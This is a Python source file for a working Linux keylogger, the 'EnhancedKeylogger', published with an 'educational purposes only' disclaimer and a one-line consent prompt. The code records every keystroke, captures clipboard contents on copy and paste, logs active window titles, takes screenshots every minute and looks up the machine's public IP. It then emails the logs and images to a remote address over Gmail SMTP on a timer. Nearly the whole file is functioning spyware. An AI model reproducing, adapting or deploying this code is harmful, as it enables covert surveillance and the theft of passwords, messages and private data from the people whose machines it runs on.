#!/usr/bin/env python3
# -*- coding: utf-8 -*-

#  ██╗  ██╗███████╗██╗   ██╗██╗      ██████╗   ██████╗  ██████╗  ██████╗ ███████╗██████╗ 
#  ██║ ██╔╝██╔════╝╚██╗ ██╔╝██║     ██╔═══██╗ ██╔════╝ ██╔═══██╗██╔═══██╗██╔════╝██╔══██╗
#  █████╔╝ █████╗   ╚████╔╝ ██║     ██║   ██║ ██║  ███╗██║   ██║██║   ██║█████╗  ██████╔╝
#  ██╔═██╗ ██╔══╝    ╚██╔╝  ██║     ██║   ██║ ██║   ██║██║   ██║██║   ██║██╔══╝  ██╔══██╗
#  ██║  ██╗███████╗   ██║   ███████╗╚██████╔╝ ╚██████╔╝╚██████╔╝╚██████╔╝███████╗██║  ██║
#  ╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝ ╚═════╝   ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝
#                                    KEYLOGGER (Linux Edition)

# ⚠️ FOR EDUCATIONAL PURPOSES ONLY. USE WITH EXPLICIT CONSENT ⚠️
#!/usr/bin/env python3
#!/usr/bin/env python3

import os
import tempfile
import threading
import datetime
import logging
import smtplib
import socket
import requests
import hashlib
import pyautogui
import clipboard
import sys
import time
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from pynput import keyboard
from cryptography.fernet import Fernet

class EnhancedKeylogger:
    """A secure, ethical keylogger for monitoring with explicit user consent."""
    
    EMAIL_SUBJECT_PREFIX = "Keylogger Report -"

    def __init__(self, log_interval=300, screenshot_interval=60,
                 from_email=None, password=None, to_email=None,
                 encryption_key=None):
        """Initialize keylogger with configuration."""
        self.log = ""
        self.log_interval = log_interval
        self.screenshot_interval = screenshot_interval
        self.from_email = from_email
        self.password = password
        self.to_email = to_email
        self.pictures = []
        self.mail = MIMEMultipart()
        self.status = True
        self.user = os.getenv("USER", "Unknown")
        self.current_key_list = set()
        self.COMBINATIONS = [
            {keyboard.Key.ctrl, keyboard.KeyCode(char='c')},
            {keyboard.Key.ctrl, keyboard.KeyCode(char='v')},
            {keyboard.Key.ctrl, keyboard.KeyCode(char='x')}
        ]
        self.encryption_key = encryption_key or Fernet.generate_key()
        self.fernet = Fernet(self.encryption_key)
        self._setup_logging()
        self._validate_config()

    def _setup_logging(self):
        """Configure logging for the keylogger."""
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('keylogger_audit.log'),
                logging.StreamHandler(sys.stdout)
            ]
        )
        logging.info("Keylogger initialized with encryption")

    def _validate_config(self):
        """Check if email configuration is complete."""
        if not self.from_email or not self.password or not self.to_email:
            logging.warning("Email configuration is incomplete")

    def _secure_temp_file(self, suffix='.jpg'):
        """Create a secure temporary file."""
        fd, path = tempfile.mkstemp(suffix=suffix)
        os.close(fd)
        return path

    def encrypt_data(self, data):
        """Encrypt data using Fernet."""
        return self.fernet.encrypt(data.encode())

    def _generate_log_hash(self, data):
        """Generate SHA-256 hash of data."""
        return hashlib.sha256(data.encode()).hexdigest()

    def take_screenshot(self):
        """Capture and store a screenshot."""
        try:
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            path = self._secure_temp_file()
            pyautogui.screenshot(path)
            self.pictures.append({"filename": f"screenshot_{timestamp}.jpg", "path": path})
            if len(self.pictures) >= 5:
                self.report(2)
            threading.Timer(self.screenshot_interval, self.take_screenshot).start()
        except Exception as e:
            logging.error(f"Screenshot error: {e}")

    def prepare_screenshots(self):
        """Prepare screenshots for email attachment."""
        for file in self.pictures:
            try:
                with open(file["path"], "rb") as img:
                    attachment = MIMEImage(img.read(), name=file["filename"])
                    self.mail.attach(attachment)
                os.remove(file["path"])
            except Exception as e:
                logging.error(f"Screenshot processing error: {e}")

    def get_active_window_title(self):
        """Get the title of the currently active window."""
        try:
            import subprocess
            win_id = subprocess.check_output(["xdotool", "getactivewindow"]).strip()
            window_name = subprocess.check_output(["xdotool", "getwindowname", win_id]).strip()
            return window_name.decode("utf-8")
        except Exception:
            return "Window Fetch Failed"

    def on_press(self, key):
        """Handle key press events."""
        current_key = ""
        try:
            if any(key in combo for combo in self.COMBINATIONS):
                self.current_key_list.add(key)
                if any(all(k in self.current_key_list for k in combo) for combo in self.COMBINATIONS):
                    current_key += "\n[CLIPBOARD START]\n"
                    try:
                        current_key += clipboard.paste()
                    except Exception:
                        current_key += "[Clipboard Read Failed]"
                    current_key += "\n[CLIPBOARD END]\n"
            if key == keyboard.Key.enter:
                current_key += "\n"
            elif key == keyboard.Key.space:
                current_key += " "
            elif key == keyboard.Key.backspace:
                self.log = self.log[:-1] if self.log else ""
            else:
                current_key += getattr(key, 'char', '')
            if current_key:
                window_title = self.get_active_window_title()
                timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                self.log += f"[{timestamp} - {window_title}] {current_key}"
        except Exception as e:
            logging.error(f"Key processing error: {e}")

    def on_release(self, key):
        """Handle key release events."""
        try:
            if any(key in combo for combo in self.COMBINATIONS):
                self.current_key_list.discard(key)
        except Exception as e:
            logging.error(f"Key release error: {e}")

    def report(self, condition=1):
        """Generate and send a report based on condition."""
        try:
            if condition == 1:
                log_hash = self._generate_log_hash(self.log)
                encrypted_log = self.encrypt_data(self.log)
                self._send_email(f"Hash: {log_hash}\n\nEncrypted:\n{encrypted_log.decode()}")
                self.log = ""
                threading.Timer(self.log_interval, self.report).start()
            elif condition == 2:
                self.prepare_screenshots()
                self._send_email()
                self.pictures = []
            elif condition == 3:
                self._send_email()
                threading.Timer(self.log_interval, self.report).start()
        except Exception as e:
            logging.error(f"Reporting error: {e}")
        finally:
            self.mail = MIMEMultipart()

    def _send_email(self, encrypted_log=None):
        """Send email with optional encrypted log attachment."""
        retries = 3
        for attempt in range(retries):
            try:
                if encrypted_log:
                    self.mail.attach(MIMEText(encrypted_log, "plain"))
                if self.status:
                    self.status = False
                    self.mail.attach(MIMEText(self._system_info(), "html"))
                timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M")
                self.mail["Subject"] = f"{self.EMAIL_SUBJECT_PREFIX} {self.user} @ {timestamp}"
                self.mail["From"] = self.from_email
                with smtplib.SMTP("smtp.gmail.com", 587) as server:
                    server.starttls()
                    server.login(self.from_email, self.password)
                    server.sendmail(self.from_email, self.to_email, self.mail.as_string())
                return
            except Exception as e:
                logging.error(f"Email send attempt {attempt+1} failed: {e}")
                time.sleep(3)
        logging.critical("All email attempts failed.")

    def _system_info(self):
        """Generate HTML-formatted system information."""
        try:
            public_ip = requests.get('https://api.ipify.org', timeout=5).text
        except:
            public_ip = "Unavailable"
        private_ip = socket.gethostbyname(socket.gethostname())
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M")
        return f"""
        <h3>System Information</h3>
        <p><b>User:</b> {self.user}</p>
        <p><b>Time:</b> {timestamp}</p>
        <p><b>Public IP:</b> {public_ip}</p>
        <p><b>Private IP:</b> {private_ip}</p>
        <hr>
        """

    def start(self):
        """Start the keylogger with explicit user consent."""
        try:
            consent = input("Do you have explicit consent to run this? (y/n): ")
            if consent.lower() != 'y':
                logging.warning("Aborted: Consent not confirmed")
                return
            logging.info("Starting keylogger with consent verification")
            listener = keyboard.Listener(on_press=self.on_press, on_release=self.on_release)
            with listener:
                self.take_screenshot()
                self.report(3)
                listener.join()
        except KeyboardInterrupt:
            logging.info("Keylogger stopped by user")
        except Exception as e:
            logging.error(f"Runtime error: {e}")
        finally:
            logging.info("Keylogger session ended")

if __name__ == "__main__":
    print("""
    ENHANCED KEYLOGGER - SECURE MONITORING TOOL
    ===========================================
    Use only with explicit consent for authorized purposes
    Unauthorized use violates privacy laws and ethics
    ===========================================
    """)
    # Debug verification
    print("[DEBUG] EnhancedKeylogger class methods:", dir(EnhancedKeylogger))
    try:
        keylogger = EnhancedKeylogger(
            log_interval=300,
            screenshot_interval=60,
            from_email=os.getenv("SENDER_EMAIL"),
            password=os.getenv("EMAIL_PASSWORD"),
            to_email=os.getenv("RECEIVER_EMAIL")
        )
        print("[DEBUG] keylogger instance methods:", dir(keylogger))
        keylogger.start()
    except Exception as e:
        logging.critical(f"Initialization failed: {e}")
